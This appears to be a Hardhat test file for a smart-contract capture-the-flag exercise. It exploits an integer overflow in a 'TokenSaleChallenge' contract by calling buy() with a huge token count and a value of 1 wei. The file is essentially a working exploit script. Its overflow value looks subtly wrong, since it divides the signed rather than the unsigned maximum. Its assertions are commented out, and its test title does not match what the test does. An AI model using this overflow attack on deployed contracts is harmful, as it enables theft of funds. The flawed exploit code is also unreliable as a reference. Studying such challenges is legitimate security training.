import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers, network } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { Contract } from 'ethers';

describe('Start Point', async function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();
    const tokenSaleChallengeFactory = await ethers.getContractFactory(
      'TokenSaleChallenge'
    );

    const tokenSaleChallengeContract = await tokenSaleChallengeFactory.deploy(
      owner.address,
      {
        value: ethers.utils.parseEther('1'),
      }
    );

    return {
      tokenSaleChallengeContract,
      owner,
      attackerWallet,
    };
  }

  describe('exploit', async function () {
    let tokenSaleChallengeContract: Contract,
      owner: SignerWithAddress,
      attackerWallet: SignerWithAddress;

    before(async function () {
      ({ tokenSaleChallengeContract, owner, attackerWallet } =
        await loadFixture(setup));
    });

    it('Should Attack after approval', async function () {
      let tokenSaleChallengeContractBalance = await ethers.provider.getBalance(
        tokenSaleChallengeContract.address
      );

      console.log({ tokenSaleChallengeContractBalance });

      await tokenSaleChallengeContract.buy(
        ethers.constants.MaxInt256.div(ethers.utils.parseEther('1')).add(1),
        {
          value: 1,
        }
      );

      tokenSaleChallengeContractBalance = await ethers.provider.getBalance(
        tokenSaleChallengeContract.address
      );

      console.log({ tokenSaleChallengeContractBalance });

      //   expect(
      //     await tokenSaleChallengeContract.balanceOf(owner.address)
      //   ).to.equal(1000);

      //   expect(
      //     await tokenSaleChallengeContract.balanceOf(owner.address)
      //   ).to.equal(100000);
    });
  });
});
